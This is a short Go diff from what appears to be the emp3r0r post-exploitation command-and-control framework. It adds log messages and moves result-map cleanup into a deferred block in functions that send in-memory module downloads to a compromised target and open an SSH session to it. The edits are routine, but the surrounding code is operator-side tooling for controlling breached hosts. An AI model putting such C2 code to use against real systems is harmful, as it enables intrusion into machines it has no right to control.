@@ -107,6 +107,7 @@ func handleInMemoryModule(config emp3r0r_data.ModConfig, payload_type, download_
 		CliPrintError("Compressing %s: %v", path, err)
 		return
 	}
+	CliPrintInfo("Created %.4fMB archive (%s) for module '%s'", float64(len(compressedBytes))/1024/1024, hosted_file, CurrentMod)
 	err = os.WriteFile(hosted_file, compressedBytes, 0o600)
 	if err != nil {
 		CliPrintError("Writing %s: %v", hosted_file, err)
@@ -115,6 +116,7 @@ func handleInMemoryModule(config emp3r0r_data.ModConfig, payload_type, download_
 	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s",
 		emp3r0r_data.C2CmdCustomModule, CurrentMod, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
 	cmd_id := uuid.NewString()
+	CliPrintInfo("Sending command %s to %s", cmd, CurrentTarget.Tag)
 	err = SendCmdToCurrentTarget(cmd, cmd_id)
 	if err != nil {
 		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
@@ -163,9 +165,6 @@ func handleInteractiveModule(config emp3r0r_data.ModConfig, cmd_id string) {
 
 	for i := 0; i < 10; i++ {
 		if strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
-			CmdResultsMutex.Lock()
-			delete(CmdResults, cmd_id)
-			CmdResultsMutex.Unlock()
 			break
 		}
 		time.Sleep(time.Second)
@@ -174,6 +173,11 @@ func handleInteractiveModule(config emp3r0r_data.ModConfig, cmd_id string) {
 		CliPrintError("%s failed to upload", CurrentMod)
 		return
 	}
+	defer func() {
+		CmdResultsMutex.Lock()
+		delete(CmdResults, cmd_id)
+		CmdResultsMutex.Unlock()
+	}()
 
 	sshErr := SSHClient(fmt.Sprintf("%s/%s/%s",
 		RuntimeConfig.AgentRoot, CurrentMod, config.Exec),
